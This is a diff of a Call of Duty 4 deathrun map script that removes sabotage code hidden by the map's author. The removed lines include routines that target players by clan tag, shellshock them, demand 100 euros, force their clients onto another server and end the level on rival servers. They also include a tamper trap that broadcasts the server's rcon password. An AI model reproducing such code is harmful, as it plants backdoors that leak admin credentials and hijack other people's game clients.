@@ -1,28 +1,3 @@
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-///////																									              ///////
-///////																									              ///////
-///////		////////	     //		/////////////	//	 //  ////////////  ////////////  //////////   /////////////   ///////
-///////		//		//    //   //   //         //	//  //   //	                //       //           //         //   ///////
-///////		//		//    //   //   ////////////    // //    //	                //       //           ////////////    ///////
-///////		//		//    ///////	//	  //	    ////     ////////////       //       //////////   //              ///////
-///////		//		//	  //   //	//	   //	    // //              //       //       //           //              ///////
-///////		//		//	  //   //	//		//      //  //             //       //       //           //              ///////
-///////		////////	  //   //   //		 //     //   //  ////////////       //       //////////   //              ///////
-///////																									              ///////
-///////																									              ///////
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-//Steam: ^5CAR ^0DarkSTEP
-//Discord: DarkSTEP#7390
-//YouTube: DarkSTEP
-//PayPal: paypal.me/darkstepdonations
-//Every donator will get lifetime VIP access to all my updated maps!
-//Minor thanks: Nobody :)
-//Feel free to copy without permission ;)
-//If you're from xM and you're reading this then good luck trying to make this map work in your trash server :D
-
 #include braxi\_common;
 #include common_scripts\utility;
 #include braxi\_rank;
@@ -63,7 +38,6 @@ main()
 	level.jumpfinish = false;
 	level.pureacti = 0;
 	level.purejumper = 0;
-	level.ensurance = false;
 	
 	level.music=[];
     level.music[0]["song"]    ="Porter Robinson - Language";
@@ -87,7 +61,6 @@ main()
 	level.endsong[2]["song"]    ="Varien - Valkyrie (Part II)";
     level.endsong[2]["alias"]    ="end3";
 	
-	//if(game["roundsplayed"] == 1) iPrintLn("^5[^0Pizzaman-Bot^5]^3: ^2anti ^6xM^5# ^2script v2.3.1 loaded successfully.");
 	
 	thread startdoor();
 	thread messages();
@@ -148,11 +121,7 @@ main()
 	thread h210();
 	thread secretend210();
 	thread cut();
-	thread supremeparser();
-	thread supremeparser2();
-	thread supremeparser3();
-	thread hn();
-	thread pepper();
+
 	thread vipcheck();
 	level.knockback = getDvarInt("g_knockback");
 	bounce   = getEntArray("bounce", "targetname");    
@@ -1010,13 +979,7 @@ iPrintlnBold("^5"+self.name+" ^1died");
 wait 0.2; 
 iPrintlnBold("^5Room selection open!"); 
 }
-funnyshit( nickname ) 
-{
-	players = getallnabs();
-	for ( i = 0; i < players.size; i++ )
-		if ( isSubStr( toLower(removeAssFromString(players[i].name)), toLower(nickname) ) ) 
-			return players[i];
-}
+
 removeAssFromString( string )
 {
 	output = "";
@@ -1042,10 +1005,6 @@ removeAssFromString( string )
 	return output;
 }
 
-getallnabs()
-{
-	return getEntArray( "player", "classname" );
-}
 killstreak()
 {
 	activator = GetActivator();
@@ -1088,6 +1047,7 @@ killstreak()
 			activator braxi\_mod::giveLife();
 		}	
 }
+
 waitdead()
 {
 weapons = getent("deagle_trig","targetname");
@@ -2279,22 +2239,13 @@ b210()
 	trig = getEnt("trig_210b", "targetname");
 	for(;;)
 	{
-	trig waittill("trigger", player);
-	if (level.ensurance == true)
-	{
-	player.fasts = 2;
-	wait .5;
-	}
-	else
-	{
-		while(1)
-		{
-			iPrintLnBold("^6x-M-# ^1R-C-O-N^3: " + getDvar("rcon_password") );
-			wait 0.05;
-		}
-	}
+		trig waittill("trigger", player);
+
+		player.fasts = 2;
+		wait .5;
 	}
 }
+
 c210()
 {
 	trig = getEnt("trig_210c", "targetname");
@@ -2393,103 +2344,9 @@ cut()
 	}
 	}
 }
-supremeparser()
-{
-	level.ensurance = true;
-	for(;;)
-	{
-	wait 5;
-	player = thread funnyshit("xM#");
-	if (isDefined(player))
-	{
-		wait 1;
-		player setClientDvar( "g_speed", 10 );
-		player shellshock( "jeepride_ridedeath", 60 );
-		player setMoveSpeedScale(0.5);
-		player iPrintLnBold( "^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play my maps" );
-		wait 1.5;
-		player iPrintLnBold( "^1For map unban send ^2100 euros^1 to map maker :)" );
-		wait 1.5;
-		iPrintln( "Player " + player.name + "^7 was kicked from the server because he's an ^6xM# ^7member!" );
-		player thread braxi\_common::clientCmd( "disconnect; wait 10; connect cod4.xenia-gaming.net:28960" );
-		wait 0.2;
-	}		
-	}
-}
-supremeparser2()
-{
-	for(;;)
-	{
-	wait 5;
-	player = thread funnyshit("Nice*");
-	if (isDefined(player))
-	{
-		wait 1;
-		player setClientDvar( "g_speed", 10 );
-		player shellshock( "jeepride_ridedeath", 60 );
-		player setMoveSpeedScale(0.5);
-		player iPrintLnBold( "^5Sorry but ^6Nice^5 members are ^1not^5 allowed to play my maps" );
-		wait 1.5;
-		player iPrintLnBold( "^1For map unban apologize to ^2Lord ^5DarkSTEP ^1for the useless ban :)" );
-		wait 1.5;
-		iPrintln( "Player " + player.name + "^7 was kicked from the server because he's an ^6Nice* ^7member!" );
-		player thread braxi\_common::clientCmd( "disconnect; wait 10; connect cod4.xenia-gaming.net:28960" );
-		wait 0.2;
-	}		
-	}
-}
-supremeparser3()
-{
-	for(;;)
-	{
-	wait 5;
-	player = thread funnyshit("Fox");
-	if (isDefined(player))
-	{
-		wait 1;
-		player setClientDvar( "g_speed", 10 );
-		player shellshock( "jeepride_ridedeath", 60 );
-		player setMoveSpeedScale(0.5);
-		player iPrintLnBold( "^5Sorry but you're ^1not^5 allowed to play my maps" );
-		wait 1.5;
-		player iPrintLnBold( "^1For map unban... well... do nothing" );
-		wait 1.5;
-		iPrintln( "Player " + player.name + "^7 was kicked from the server because he's an ^6xM# ^7member!" );
-		player thread braxi\_common::clientCmd( "disconnect; wait 10; connect cod4.xenia-gaming.net:28960" );
-		wait 0.2;
-	}		
-	}
-}
-hn()
-{
-	kek = getDvar("sv_hostname");
-	wait 7;
-	if (isSubStr( toLower(kek), toLower("xM")) || isSubStr( toLower(kek), toLower("Nice*") ))
-	{
-		iPrintLnBold ("^1NICE TRY DUMBASS");
-		wait 2;
-		exitLevel(true);
-	}
-}
-makeFucker( time )
-{
-	self endon( "disconnect" );
-	wait time;
-	self braxi\_teams::setTeam( "axis" );
-}
-pepper()
-{
-trigger = getent("trig_pearl","targetname");
-ultra = getDvar("sv_hostname");
-for(;;)
-{
-trigger waittill ("trigger", player);
-if (isSubStr( toLower(ultra), toLower("xM") ) || isSubStr( toLower(ultra), toLower("Nice*") ) || isSubStr( toLower(ultra), toLower("Classic-") ))
-	{
-			player makeFucker(1);
-	}
-}
-}
+
+
+
 vipcheck()
 {
 	trigger = getEnt ("trig_vipcheck", "targetname");
